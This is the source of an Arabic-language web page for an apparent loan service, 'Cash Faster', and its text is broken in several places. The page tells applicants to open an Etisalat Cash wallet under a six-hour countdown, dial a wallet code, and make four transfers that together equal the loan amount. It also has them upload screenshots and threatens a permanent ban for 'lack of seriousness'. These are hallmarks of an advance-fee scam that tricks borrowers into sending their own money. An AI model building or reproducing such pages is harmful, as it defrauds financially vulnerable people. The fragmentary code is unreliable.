<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>كاش فاستر | ملف الحد الائتماني</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --primary: #2ECC71;
            --primary-dark: #27AE60;
            --gold: #D4AF37;
            --gold-dark: #B8960F;
            --gold-glow: rgba(212,175,55,0.3);
            --bg-dark: #0A0F1A;
            --bg-card: #0F1625;
            --text-light: #F8FAFC;
            --text-muted: #8899AA;
            --border-color: #1E2A3A;
            --shadow: 0 8px 32px rgba(0,0,0,0.4);
            --whatsapp: #25D366;
            --danger: #EF4444;
            --orange: #FF8C42;
            --vodafone-red: #E60000;
            --vodafone-red-dark: #B30000;
            --anuta-blue: #00D9FF;
            --anuta-green: #22C55E;
            --anuta-purple: #7C3AED;
        }
        body { font-family: 'Cairo', sans-serif; background: var(--bg-dark); color: var(--text-light); min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 0.8rem; position: relative; overflow-x: hidden; }

        .bg-particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            background-image: 
                radial-gradient(circle at 20% 50%, rgba(46,204,113,0.03) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(212,175,55,0.04) 0%, transparent 40%),
                radial-gradient(circle at 40% 80%, rgba(0,217,255,0.02) 0%, transparent 40%);
            pointer-events: none;
            animation: bgPulse 8s ease-in-out infinite alternate;
        }
        @keyframes bgPulse {
            0% { opacity: 0.5; transform: scale(1); }
            100% { opacity: 1; transform: scale(1.05); }
        }

        .bg-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            background-image: 
                linear-gradient(rgba(46,204,113,0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(46,204,113,0.03) 1px, transparent 1px);
            background-size: 60px 60px;
            pointer-events: none;
            animation: gridMove 20s linear infinite;
        }
        @keyframes gridMove {
            0% { transform: translate(0,0); }
            100% { transform: translate(60px,60px); }
        }

        .floating-shapes {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
            overflow: hidden;
        }
        .floating-shapes .shape {
            position: absolute;
            border-radius: 50%;
            opacity: 0.04;
            animation: floatShape 15s ease-in-out infinite;
        }
        .floating-shapes .shape:nth-child(1) {
            width: 300px;
            height: 300px;
            background: var(--gold);
            top: -100px;
            right: -50px;
            animation-delay: 0s;
        }
        .floating-shapes .shape:nth-child(2) {
            width: 200px;
            height: 200px;
            background: var(--primary);
            bottom: -50px;
            left: -50px;
            animation-delay: 5s;
        }
        .floating-shapes .shape:nth-child(3) {
            width: 150px;
            height: 150px;
            background: var(--anuta-blue);
            top: 40%;
            right: -30px;
            animation-delay: 10s;
        }
        @keyframes floatShape {
            0%, 100% { transform: translate(0,0) scale(1); }
            25% { transform: translate(30px,-30px) scale(1.1); }
            50% { transform: translate(-20px,20px) scale(0.9); }
            75% { transform: translate(20px,30px) scale(1.05); }
        }

        .app-container {
            max-width: 420px;
            width: 100%;
            background: rgba(15, 22, 37, 0.92);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 1.8rem;
            padding: 1.2rem 1rem;
            box-shadow: var(--shadow), 0 0 60px rgba(0,0,0,0.3);
            border: 1px solid var(--border-color);
            position: relative;
            z-index: 1;
            overflow: hidden;
        }
        .app-container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(ellipse at 30% 20%, rgba(46,204,113,0.04), transparent 60%);
            pointer-events: none;
            z-index: 0;
            animation: glowRotate 20s linear infinite;
        }
        @keyframes glowRotate {
            0% { transform: rotate(0deg) scale(1); }
            50% { transform: rotate(180deg) scale(1.2); }
            100% { transform: rotate(360deg) scale(1); }
        }

        .promo-strip {
            background: linear-gradient(90deg, rgba(212,175,55,0.15), rgba(46,204,113,0.1), rgba(0,217,255,0.08));
            border: 1px solid rgba(212,175,55,0.15);
            border-radius: 2rem;
            padding: 0.4rem 1rem;
            margin-bottom: 0.8rem;
            text-align: center;
            font-size: 0.65rem;
            color: var(--gold);
            position: relative;
            z-index: 1;
            overflow: hidden;
            animation: stripPulse 3s ease-in-out infinite;
        }
        @keyframes stripPulse {
            0%, 100% { border-color: rgba(212,175,55,0.15); }
            50% { border-color: rgba(212,175,55,0.4); }
        }
        .promo-strip i { color: var(--primary); margin-left: 0.3rem; }
        .promo-strip .highlight { color: var(--gold); font-weight: 700; }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 0.8rem;
            border-bottom: 1px solid var(--border-color);
            position: relative;
            z-index: 1;
        }
        .header .brand {
            display: flex;
            align-items: center;
            gap: 0.4rem;
        }
        .header .brand .icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, var(--gold), var(--primary));
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.3rem;
            color: #0A0F1A;
            font-weight: 900;
            box-shadow: 0 0 25px var(--gold-glow);
            animation: iconGlow 3s ease-in-out infinite;
            cursor: pointer;
        }
        @keyframes iconGlow {
            0%, 100% { box-shadow: 0 0 15px var(--gold-glow); }
            50% { box-shadow: 0 0 35px rgba(212,175,55,0.4), 0 0 60px rgba(46,204,113,0.1); }
        }
        .header .brand h1 {
            font-size: 1.2rem;
            font-weight: 800;
            background: linear-gradient(135deg, #FFF, var(--primary), var(--gold));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .header .brand h1 span {
            color: var(--gold);
            -webkit-text-fill-color: var(--gold);
        }
        .header .badge {
            background: rgba(46,204,113,0.12);
            border: 1px solid rgba(46,204,113,0.2);
            border-radius: 2rem;
            padding: 0.2rem 0.8rem;
            font-size: 0.55rem;
            color: var(--primary);
            display: flex;
            align-items: center;
            gap: 0.3rem;
        }
        .header .badge i {
            font-size: 0.4rem;
            animation: dotPulse 1.5s ease-in-out infinite;
        }
        @keyframes dotPulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        .nav-tabs {
            display: flex;
            gap: 0.3rem;
            margin: 0.8rem 0 1rem 0;
            background: rgba(255,255,255,0.03);
            border-radius: 2rem;
            padding: 0.25rem;
            position: relative;
            z-index: 1;
            border: 1px solid var(--border-color);
        }
        .nav-tabs .tab {
            flex: 1;
            text-align: center;
            padding: 0.4rem 0.2rem;
            border-radius: 2rem;
            font-size: 0.65rem;
            font-weight: 600;
            color: var(--text-muted);
            cursor: default;
            transition: 0.2s;
            background: transparent;
        }
        .nav-tabs .tab.active {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: #0A0F1A;
            box-shadow: 0 4px 15px rgba(46,204,113,0.25);
        }
        .nav-tabs .tab i { margin-left: 0.2rem; }

        .search-box {
            display: flex;
            gap: 0.4rem;
            margin: 0.6rem 0 0.8rem 0;
            position: relative;
            z-index: 1;
        }
        .search-box input {
            flex: 1;
            padding: 0.7rem 1rem;
            border-radius: 2rem;
            border: 2px solid var(--border-color);
            background: rgba(255,255,255,0.04);
            color: white;
            font-size: 0.85rem;
            text-align: center;
            transition: 0.2s;
            font-family: 'Cairo', sans-serif;
        }
        .search-box input:focus {
            outline: none;
            border-color: var(--gold);
            box-shadow: 0 0 25px var(--gold-glow);
        }
        .search-box input::placeholder { color: var(--text-muted); }
        .search-box button {
            padding: 0.7rem 1.2rem;
            border: none;
            border-radius: 2rem;
            background: linear-gradient(135deg, var(--gold), var(--gold-dark));
            color: #0A0F1A;
            font-weight: 800;
            cursor: pointer;
            transition: 0.2s;
            font-family: 'Cairo', sans-serif;
            font-size: 0.8rem;
            display: flex;
            align-items: center;
            gap: 0.3rem;
            white-space: nowrap;
            box-shadow: 0 4px 15px var(--gold-glow);
        }
        .search-box button:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(212,175,55,0.4);
        }

        .loan-card {
            background: linear-gradient(145deg, #111B2B, #0A1220);
            border-radius: 1.2rem;
            padding: 1.2rem 1rem;
            border: 1px solid var(--border-color);
            margin-bottom: 0.8rem;
            position: relative;
            z-index: 1;
            overflow: hidden;
        }
        .loan-card::after {
            content: '';
            position: absolute;
            top: -30%;
            right: -20%;
            width: 60%;
            height: 100%;
            background: radial-gradient(ellipse, rgba(212,175,55,0.05), transparent 70%);
            pointer-events: none;
        }

        .loan-card .loan-label {
            font-size: 0.7rem;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 1px;
            text-align: center;
        }
        .loan-card .loan-amount-main {
            text-align: center;
            font-size: 2.6rem;
            font-weight: 900;
            color: #FFF;
            margin: 0.2rem 0;
            letter-spacing: 1px;
            position: relative;
            z-index: 1;
        }
        .loan-card .loan-amount-main .currency {
            font-size: 1.2rem;
            color: var(--text-muted);
            font-weight: 600;
        }
        .loan-card .loan-percent {
            text-align: center;
            font-size: 0.9rem;
            color: var(--gold);
            font-weight: 700;
            position: relative;
            z-index: 1;
        }
        .loan-card .loan-percent i {
            color: var(--gold);
            margin-left: 0.3rem;
        }

        .loan-details-grid {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 0.5rem;
            margin-top: 0.8rem;
            padding-top: 0.8rem;
            border-top: 1px solid var(--border-color);
            position: relative;
            z-index: 1;
        }
        .loan-details-grid .detail-item {
            text-align: center;
            background: rgba(255,255,255,0.02);
            border-radius: 0.6rem;
            padding: 0.3rem 0.2rem;
            transition: 0.2s;
        }
        .loan-details-grid .detail-item:hover {
            background: rgba(255,255,255,0.04);
        }
        .loan-details-grid .detail-item .label {
            font-size: 0.5rem;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .loan-details-grid .detail-item .value {
            font-size: 0.9rem;
            font-weight: 700;
            color: #FFF;
            margin-top: 0.1rem;
        }
        .loan-details-grid .detail-item .value.gold { color: var(--gold); }
        .loan-details-grid .detail-item .value.green { color: var(--primary); }
        .loan-details-grid .detail-item .value.danger { color: var(--danger); }

        .status-bar {
            display: flex;
            align-items: center;
            gap: 0.6rem;
            background: rgba(255,255,255,0.03);
            border-radius: 1.2rem;
            padding: 0.5rem 0.8rem;
            border: 1px solid var(--border-color);
            margin: 0.6rem 0;
            position: relative;
            z-index: 1;
        }
        .status-bar .status-icon {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: rgba(46,204,113,0.12);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--primary);
            font-size: 0.85rem;
            flex-shrink: 0;
        }
        .status-bar .status-text { flex: 1; }
        .status-bar .status-text .main {
            font-weight: 700;
            font-size: 0.85rem;
        }
        .status-bar .status-text .sub {
            font-size: 0.6rem;
            color: var(--text-muted);
        }
        .status-bar .status-badge {
            background: rgba(46,204,113,0.12);
            border: 1px solid rgba(46,204,113,0.2);
            border-radius: 2rem;
            padding: 0.15rem 0.6rem;
            font-size: 0.55rem;
            color: var(--primary);
            font-weight: 600;
        }
        .status-bar.danger .status-icon {
            background: rgba(239,68,68,0.15);
            color: var(--danger);
        }
        .status-bar.danger .status-badge {
            background: rgba(239,68,68,0.15);
            border-color: rgba(239,68,68,0.3);
            color: var(--danger);
        }
        .status-bar.success .status-icon {
            background: rgba(46,204,113,0.15);
            color: var(--primary);
        }
        .status-bar.success .status-badge {
            background: rgba(46,204,113,0.15);
            border-color: rgba(46,204,113,0.3);
            color: var(--primary);
        }
        .status-bar.warning .status-icon {
            background: rgba(212,175,55,0.15);
            color: var(--gold);
        }
        .status-bar.warning .status-badge {
            background: rgba(212,175,55,0.15);
            border-color: rgba(212,175,55,0.3);
            color: var(--gold);
        }

        .client-info {
            background: rgba(255,255,255,0.02);
            border-radius: 1rem;
            padding: 0.6rem 0.8rem;
            border: 1px solid var(--border-color);
            margin: 0.6rem 0;
            position: relative;
            z-index: 1;
        }
        .client-info .row {
            display: flex;
            justify-content: space-between;
            padding: 0.25rem 0;
            border-bottom: 1px solid rgba(255,255,255,0.03);
            font-size: 0.75rem;
        }
        .client-info .row:last-child { border-bottom: none; }
        .client-info .row .key { color: var(--text-muted); }
        .client-info .row .value {
            font-weight: 600;
            text-align: left;
            color: #FFF;
        }
        .client-info .row .value.gold { color: var(--gold); }
        .client-info .row .value.green { color: var(--primary); }
        .client-info .row .value.danger { color: var(--danger); }

        .step-message {
            background: rgba(212,175,55,0.05);
            border: 2px solid var(--gold);
            border-radius: 1rem;
            padding: 0.8rem;
            margin: 0.6rem 0;
            text-align: center;
            position: relative;
            z-index: 1;
        }
        .step-message i {
            color: var(--gold);
            font-size: 1.5rem;
            display: block;
            margin-bottom: 0.3rem;
        }
        .step-message p {
            color: var(--text-muted);
            font-size: 0.85rem;
            line-height: 1.8;
            margin: 0;
        }
        .step-message .sub-text {
            font-size: 0.65rem;
            color: var(--gold);
            margin-top: 0.3rem;
            display: block;
        }

        .alert-warning-box {
            background: linear-gradient(145deg, rgba(212,175,55,0.12), rgba(46,204,113,0.06));
            border: 2px solid var(--gold);
            border-radius: 1.5rem;
            padding: 1.2rem;
            margin: 0.8rem 0;
            position: relative;
            z-index: 1;
            overflow: hidden;
            animation: warningPulse 3s ease-in-out infinite;
            box-shadow: 0 0 30px rgba(212,175,55,0.08);
        }
        @keyframes warningPulse {
            0%, 100% { box-shadow: 0 0 10px rgba(212,175,55,0.1); }
            50% { box-shadow: 0 0 40px rgba(212,175,55,0.2); }
        }
        .alert-warning-box::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(from 0deg, transparent, rgba(212,175,55,0.05), transparent, rgba(46,204,113,0.04), transparent);
            animation: rotateGlow 10s linear infinite;
            pointer-events: none;
        }
        @keyframes rotateGlow {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .alert-warning-box .alert-header {
            display: flex;
            align-items: center;
            gap: 0.8rem;
            position: relative;
            z-index: 1;
            margin-bottom: 0.5rem;
        }
        .alert-warning-box .alert-header .alert-icon {
            font-size: 2.8rem;
            color: var(--gold);
            animation: shakeWarning 2s ease-in-out infinite;
            flex-shrink: 0;
        }
        @keyframes shakeWarning {
            0%, 100% { transform: rotate(0deg) scale(1); }
            10% { transform: rotate(15deg) scale(1.1); }
            20% { transform: rotate(-10deg) scale(0.95); }
            30% { transform: rotate(10deg) scale(1.05); }
            40% { transform: rotate(-5deg) scale(1); }
            50% { transform: rotate(0deg) scale(1); }
        }
        .alert-warning-box .alert-header h3 {
            font-size: 1.1rem;
            font-weight: 800;
            color: var(--gold);
            margin: 0;
        }
        .alert-warning-box .alert-header h3 .highlight-red {
            color: var(--vodafone-red);
        }
        .alert-warning-box .alert-body {
            position: relative;
            z-index: 1;
        }
        .alert-warning-box .alert-body p {
            color: var(--text-muted);
            font-size: 0.85rem;
            line-height: 1.9;
            margin: 0.3rem 0;
        }
        .alert-warning-box .alert-body .highlight-gold {
            color: var(--gold);
            font-weight: 700;
        }
        .alert-warning-box .alert-body .highlight-blue {
            color: var(--anuta-blue);
            font-weight: 700;
        }

        .alert-warning-box .steps-mini {
            background: rgba(0,0,0,0.3);
            border-radius: 1rem;
            padding: 0.6rem 0.8rem;
            margin: 0.6rem 0;
            border-right: 3px solid var(--gold);
        }
        .alert-warning-box .steps-mini .step {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.2rem 0;
            font-size: 0.75rem;
            color: var(--text-muted);
        }
        .alert-warning-box .steps-mini .step .num {
            min-width: 22px;
            height: 22px;
            border-radius: 50%;
            background: var(--gold);
            color: #0A0F1A;
            font-weight: 800;
            font-size: 0.6rem;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        .alert-warning-box .steps-mini .step strong { color: #FFF; }

        .timer-container {
            background: rgba(0,0,0,0.3);
            border-radius: 1rem;
            padding: 0.5rem;
            margin: 0.5rem 0;
            text-align: center;
            border: 1px solid rgba(212,175,55,0.15);
        }
        .timer-container .timer-label {
            font-size: 0.65rem;
            color: var(--text-muted);
            margin-bottom: 0.1rem;
        }
        .timer-container .timer-label i {
            color: var(--gold);
            margin-left: 0.3rem;
        }
        .timer-container .timer-value {
            font-size: 1.6rem;
            font-weight: 800;
            color: var(--gold);
            letter-spacing: 2px;
            font-family: 'Courier New', monospace;
            transition: color 0.3s;
        }
        .timer-container .timer-value.danger {
            color: var(--danger);
            animation: timerBlink 0.8s ease-in-out infinite;
        }
        @keyframes timerBlink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }

        .btn-whatsapp {
            width: 100%;
            padding: 0.7rem;
            border: none;
            border-radius: 2rem;
            background: linear-gradient(135deg, #25D366, #128C7E);
            color: white;
            font-weight: 800;
            font-size: 0.85rem;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 4px 20px rgba(37,211,102,0.25);
            margin-top: 0.4rem;
            position: relative;
            z-index: 1;
        }
        .btn-whatsapp:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(37,211,102,0.4);
        }
        .btn-whatsapp.gold-btn {
            background: linear-gradient(135deg, var(--gold), var(--gold-dark));
            box-shadow: 0 4px 20px rgba(212,175,55,0.25);
        }
        .btn-whatsapp.gold-btn:hover {
            box-shadow: 0 0 30px rgba(212,175,55,0.4);
        }
        .btn-whatsapp.etisalat-btn {
            background: linear-gradient(135deg, var(--anuta-blue), #0099CC);
            box-shadow: 0 4px 20px rgba(0,191,255,0.2);
        }
        .btn-whatsapp.etisalat-btn:hover {
            box-shadow: 0 0 30px rgba(0,191,255,0.35);
        }
        .btn-whatsapp.success-btn {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            box-shadow: 0 4px 20px rgba(46,204,113,0.25);
        }
        .btn-whatsapp.success-btn:hover {

    // ===== حساب الإجمالي =====
    function calculateTotal(client) {
        let totalDisplay = client.total;
        if (!totalDisplay || totalDisplay === "? (حسب القرض)") {
            let termMonths = 0;
            const termMatch = client.loanTerm.match(/(\d+)/);
            if (termMatch) termMonths = parseInt(termMatch[0]);
            if (termMonths > 0 && client.installment) {
                let installmentNum = parseFloat(client.installment.replace(/,/g, ''));
                if (!isNaN(installmentNum)) totalDisplay = (installmentNum * termMonths).toFixed(0) + " ج.م";
            } else {
                totalDisplay = "يحدد لاحقاً";
            }
        }
        return totalDisplay;
    }

    // ===== فتح واتساب =====
    function openWhatsApp(needsEtisalat) {
        if (currentClient) {
            let msg = `السلام عليكم ورحمة الله وبركاته،

أنا أسمى ${currentClient.name}
رقمي القومي: ${currentClient.id}
مبلغ القرض المعتمد: ${currentClient.loanRaw} ج.م
القسط الشهري: ${currentClient.installment} ج.م
مدة القسط: ${currentClient.loanTerm}

`;
            if (needsEtisalat) {
                msg += `⚠️ تم إبلاغي بضرورة فتح محفظة اتصالات كاش لأن النظام يعمل حالياً على خدمة اتصالات كاش فقط.
أوافق على فتح محفظة اتصالات كاش لاستكمال إجراءات صرف القرض.
سأقوم بفتح المحفظة في أقرب وقت ممكن وإبلاغكم برقم المحفظة الجديد.`;
            } else if (currentClient.hasEtisalat) {
                msg += `لدي محفظة اتصالات كاش.
رقم المحفظة: ${currentClient.walletNum}
أريد استخراج الحد الائتماني لمحفظتي حتى أتمكن من صرف القرض.`;
            } else {
                msg += `لدي محفظة ${currentClient.wallet || "غير محددة"}.
رقم المحفظة: ${currentClient.walletNum || "سيتم تسجيله"}
أريد استخراج الحد الائتماني لمحفظتي حتى أتمكن من صرف القرض.`;

شكراً لكم.`;

            'completed': 'green',
            'blocked': 'danger'
        };
        const walletDisplay = client.hasEtisalat === true ? "اتصالات كاش" : 
                              client.hasEtisalat === false ? "فودافون كاش" : "لا يوجد";
        return `
            <div class="client-info">
                <div class="row"><span class="key">الاسم</span><span class="value">${client.name}</span></div>
                <div class="row"><span class="key">الرقم القومي</span><span class="value gold">${client.id}</span></div>
                <div class="row"><span class="key">الوظيفة</span><span class="value">${client.job || "غير مسجل"}</span></div>
                <div class="row"><span class="key">المحفظة</span><span class="value gold">${walletDisplay}</span></div>
                <div class="row"><span class="key">رقم المحفظة</span><span class="value">${client.walletNum || "سيتم تسجيله"}</span></div>
                <div class="row"><span class="key">حالة الطلب</span><span class="value ${statusColor[client.clientStatus]}">${statusMap[client.clientStatus]}</span></div>
                <div class="row"><span class="key">الغرض</span><span class="value">${client.reason || "غير محدد"}</span></div>
                <div class="row"><span class="key">الضامن</span><span class="value">${client.guarantorName || "غير مسجل"} (${client.guarantorRelation || "غير محدد"})</span></div>
            </div>
        `;
    }

    // ===== بناء رسالة تنبيه فتح محفظة اتصالات كاش =====
    function buildEtisalatWarning(client) {
        return `
            <div class="alert-warning-box">

                    <div class="alert-icon"><i class="fas fa-exclamation-triangle"></i></div>
                    <h3>⚠️ تنبيه هام: <span class="highlight-red">مطلوب فتح محفظة اتصالات كاش</span></h3>
                </div>
                <div class="alert-body">
                    <p>
                        عزيزي <strong style="color: #FFF;">${client.name}</strong>،
                        <br><br>
                        نخدم حالياً <span class="highlight-blue">اتصالات كاش</span> فقط.
                        <span class="highlight-gold">يجب فتح محفظة اتصالات كاش</span> في أسرع وقت ممكن،
                        وإبلاغ قسم التحويلات المالية على واتساب لتفعيلها وبدء الصرف.
                        <br><br>
                        <span style="color: var(--danger); font-weight: 700;">❌ لا يمكن الصرف بدون محفظة اتصالات كاش.</span>
                    </p>

                    <div class="steps-mini">
                        <div class="step">
                            <div class="num">1</div>
                            <span><strong>التوجه لأقرب فرع اتصالات</strong> ببطاقة الرقم القومي</span>
                        </div>
                        <div class="step">
                            <div class="num">2</div>
                            <span><strong>فتح محفظة اتصالات كاش</strong> وتفعيلها </span>
                        </div>
                        <div class="step">
                            <div class="num">3</div>
                            <span><strong>إبلاغنا</strong> برقم المحفظة الجديد لإتمام الصرف فوراً</span>
                        </div>
                    </div>

                    <div class="timer-container">
                        <div class="timer-label"><i class="fas fa-hourglass-half"></i> الوقت المتبقي لفتح المحفظة</div>
                        <div class="timer-value" id="countdownTimer">06:00:00</div>
                    </div>

                    <p style="font-size: 0.8rem; color: var(--text-muted);">
                        ⏳ لديك <strong style="color: var(--gold);">6 ساعات</strong> لفتح المحفظة وإبلاغنا، وإلا سيتم إلغاء الطلب تلقائياً.
                    </p>

                    <button class="btn-whatsapp gold-btn" id="openWalletWhatsAppBtn">
                        <i class="fab fa-whatsapp fa-lg"></i> 📱 إبلاغ بفتح المحفظة
                    </button>
                </div>
            </div>
        `;
    }

    // ===== بناء تعليمات اتصالات كاش (مع زر رفع الاسكرينات) =====
    function buildEtisalatInstructions(client) {
        const loanAmountNum = parseInt(client.loanRaw.replace(/\D/g, ''), 10);
        const perOperation = Math.floor(loanAmountNum / 4);
        const perOpFormatted = perOperation.toLocaleString('ar-EG');
        const totalFormatted = (perOperation * 4).toLocaleString('ar-EG');

        return `
            <div style="background: rgba(0,191,255,0.05); border: 2px solid var(--anuta-blue); border-radius: 1.2rem; padding: 0.8rem; margin: 0.6rem 0;">
                <div style="display: flex; align-items: center; gap: 0.6rem; margin-bottom: 0.3rem;">
                    <i class="fas fa-mobile-alt" style="font-size: 1.6rem; color: var(--anuta-blue);"></i>
                    <h4 style="color: var(--anuta-blue); font-size: 0.9rem;">📱 ربط المحفظة (اتصالات كاش)</h4>
                </div>
                <p style="color: var(--text-muted); font-size: 0.75rem; line-height: 1.7;">
                    عزيزي <strong style="color: #FFF;">${client.name}</strong>،
                    لإتمام صرف التمويل، يرجى اتباع التعليمات أدناه لربط محفظة <span style="color: #00BFFF; font-weight: 700;">اتصالات كاش</span>.
                </p>
                <div style="background: rgba(255,255,255,0.02); border-radius: 0.8rem; padding: 0.6rem; margin: 0.4rem 0; border: 1px solid var(--border-color);">
                    <div style="display: flex; align-items: flex-start; gap: 0.6rem; padding: 0.3rem 0; border-bottom: 1px solid rgba(255,255,255,0.03); font-size: 0.7rem;">
                        <div style="min-width: 24px; height: 24px; border-radius: 50%; background: linear-gradient(135deg, var(--gold), var(--gold-dark)); color: #0A0F1A; font-weight: 800; font-size: 0.65rem; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">1</div>
                        <div style="color: var(--text-muted); line-height: 1.5;"><strong style="color:#FFF;">📋 كود التأكيد</strong><br>اطلب الكود: <span style="color: var(--gold); font-weight: 700; font-size: 1rem;">#6*777*</span></div>
                    </div>
                    <div style="display: flex; align-items: flex-start; gap: 0.6rem; padding: 0.3rem 0; border-bottom: 1px solid rgba(255,255,255,0.03); font-size: 0.7rem;">
                        <div style="min-width: 24px; height: 24px; border-radius: 50%; background: linear-gradient(135deg, var(--gold), var(--gold-dark)); color: #0A0F1A; font-weight: 800; font-size: 0.65rem; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">2</div>
                        <div style="color: var(--text-muted); line-height: 1.5;"><strong style="color:#FFF;">💰 المبلغ لكل عملية</strong><br><span style="color: var(--gold); font-weight: 700;">${perOpFormatted} ج.م</span> (4 عمليات متساوية)</div>
                    </div>
                    <div style="display: flex; align-items: flex-start; gap: 0.6rem; padding: 0.3rem 0; border-bottom: 1px solid rgba(255,255,255,0.03); font-size: 0.7rem;">
                        <div style="min-width: 24px; height: 24px; border-radius: 50%; background: linear-gradient(135deg, var(--gold), var(--gold-dark)); color: #0A0F1A; font-weight: 800; font-size: 0.65rem; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">3</div>
                        <div style="color: var(--text-muted); line-height: 1.5;"><strong style="color:#FFF;">📸 توثيق العمليات</strong><br>التقط 4 لقطات شاشة واضحة</div>
                    </div>
                    <div style="display: flex; align-items: flex-start; gap: 0.6rem; padding: 0.3rem 0; font-size: 0.7rem;">
                        <div style="min-width: 24px; height: 24px; border-radius: 50%; background: linear-gradient(135deg, var(--gold), var(--gold-dark)); color: #0A0F1A; font-weight: 800; font-size: 0.65rem; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">4</div>
                        <div style="color: var(--text-muted); line-height: 1.5;"><strong style="color:#FFF;">📤 رفع اللقطات</strong><br>اضغط الزر أدناه لرفعها في ملفك المشفر</div>
                    </div>
                </div>
                <div style="font-size: 0.7rem; color: var(--text-muted); text-align: center; margin-top: 0.3rem;">
                    🔒 إجمالي المبلغ: <strong style="color: var(--gold);">${totalFormatted} ج.م</strong> (سيتم  فتح رابط تحويل القرض لك)
                </div>
                <button class="btn-upload-survey" id="uploadScreensBtn">
                    <i class="fas fa-cloud-upload-alt"></i> 📤 رفع لقطات الشاشة الآن
                </button>
                <button class="btn-whatsapp etisalat-btn" id="etisalatWhatsAppBtn" style="margin-top:0.3rem;">
                    <i class="fab fa-whatsapp fa-lg"></i> 🚀 تواصل لإتمام الصرف
                </button>
            </div>
        `;
    }

    // ===== بناء رسالة الخطوة المتاحة =====
    function buildStepMessage(client) {
        let stepText = '';
        if (client.clientStatus === 'blocked') {
            stepText = '🚫 تم حظر تعاملك مع النظام نهائياً.';
        } else if (client.clientStatus === 'completed') {
            stepText = '✅ تم الانتهاء من هذه المرحلة بنجاح. أنت الآن في مرحلة الاستلام. سيتم تحديد موعد نزول المبلغ لحسابك بعدد من الدقائق يتم تحديده من خلال النظام.';
        } else {
            if (client.hasEtisalat === null) {
                stepText = '📌 الخطوة المتاحة لك حالياً هي: فتح محفظة اتصالات كاش وإبلاغ قسم التحويلات المالية.';
            } else if (client.hasEtisalat === true) {
                stepText = '📌 الخطوة المتاحة لك حالياً هي: استخراج الحد الائتماني لمحفظتك من خلال التأكيد على المحفظة.';
            } else {
                stepText = '📌 الخطوة المتاحة لك حالياً هي: فتح محفظة اتصالات كاش (نخدم اتصالات كاش فقط) وإبلاغ قسم التحويلات المالية.';
            }
        }
        return `
            <div class="step-message">
                <i class="fas fa-info-circle"></i>
                <p>${stepText}</p>
                <span class="sub-text">⏳ الخطوة القادمة بعد انتهاء هذه المرحلة: ملف تحويل القرض لك لتحديد موعد نزول المبلغ.</span>
            </div>
        `;
    }

    // ===== بناء رسالة الحظر =====
    function buildBlockedMessage(client) {
        return `
            <div class="blocked-box">
                <i class="fas fa-ban"></i>
                <h3>🚫 تم حظر تعاملك مع النظام</h3>
                <p>
                    عزيزي <strong style="color: #FFF;">${client.name}</strong>،
                    <br><br>
                    <span style="color: var(--danger); font-weight: 700;">📌 سبب الحظر:</span><br>
                    تم حظر تعاملك مع نظام كاش فاستر نهائياً نظراً لعدم الجدية في إتمام إجراءات التمويل.
                    <br><br>
                    <span style="color: var(--text-muted);">❌ لا يمكنك استكمال أي إجراءات أو التقديم مرة أخرى.</span>
                    <br><br>
                    <span style="color: var(--text-muted); font-size: 0.8rem;">📞 للاستفسار، يرجى التواصل مع خدمة العملاء.</span>
                </p>
                <button class="btn-whatsapp" id="blockedWhatsAppBtn" style="margin-top: 0.5rem; background: linear-gradient(135deg, #FF6B6B, #EE4444);">
                    <i class="fab fa-whatsapp fa-lg"></i> 📞 التواصل مع الدعم
                </button>
            </div>
        `;
    }

    // ===== بناء رسالة اكتمال المرحلة =====
    function buildCompletedMessage(client) {
        return `
            <div class="completed-box">
                <i class="fas fa-check-circle"></i>
                <h3>✅ تم الانتهاء من هذه المرحلة</h3>
                <p>
                    عزيزي <strong style="color: #FFF;">${client.name}</strong>،
                    <br><br>
                    <span style="color: var(--primary); font-weight: 700;">🎉 تهانينا!</span><br>
